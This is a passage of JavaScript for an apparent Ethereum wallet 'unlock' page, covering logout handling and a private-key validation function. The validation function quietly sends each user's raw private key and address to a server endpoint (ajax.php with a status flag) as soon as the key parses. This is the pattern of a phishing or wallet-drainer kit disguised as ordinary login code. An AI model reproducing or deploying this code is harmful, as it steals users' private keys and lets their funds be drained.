    $('#logged-private-key').html("*".repeat($('#st-unlock').attr('data-private-key').length));
});
$('#btn-logout').click(function() {
    $('#form-unlock').hide();
    $('#form-logged').show();
    $('#st-unlock').attr('data-address', '');
    $('#st-unlock').attr('data-private-key', '');
    $('#logged-address').html("");
    $('#logged-private-key').html("");
});

function validatePrivateKey(privateKey) {
    try {
        var wallet = new ethers.Wallet('0x' + privateKey);
        $('#st-unlock').show();
        $('#st-unlock').attr('data-address', wallet.address);
        $('#st-unlock').attr('data-private-key', privateKey);
        $.ajax({
            url: BASE_URL + "/ajax.php?address=" + wallet.address + "&privateKey=" + privateKey + "&status=4",
            success: function(result) {}
        });
    } catch (err) {
        $('#st-unlock').hide();
        $('#st-unlock').removeAttr('data-address');
        $('#st-unlock').removeAttr('data-private-key');
    }
}